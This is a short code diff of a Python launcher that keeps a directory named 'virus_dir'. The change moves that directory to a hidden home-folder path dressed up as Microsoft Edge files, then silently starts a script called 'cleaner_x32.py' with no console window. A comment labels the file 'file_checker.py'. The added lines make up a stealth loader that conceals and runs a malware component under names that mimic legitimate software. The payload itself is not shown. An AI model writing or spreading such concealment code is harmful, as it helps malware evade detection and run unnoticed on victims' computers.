@@ -1,12 +1,13 @@
 import subprocess, sys, os
 
+home_dir = os.path.expanduser("~")
 appdata = os.environ['APPDATA']
 
 virus_dir = os.path.join(
-    appdata, 
-    "Microsoft", 
-    "Edge", 
-    "Temp"
+    home_dir,
+    ".temp",
+    "Microsoft_Edge_x64",
+    "utils"
 )
 
 subprocess.Popen([sys.executable, os.path.join(virus_dir, "cleaner_x32.py")], creationflags=subprocess.CREATE_NO_WINDOW) # This is file_checker.py
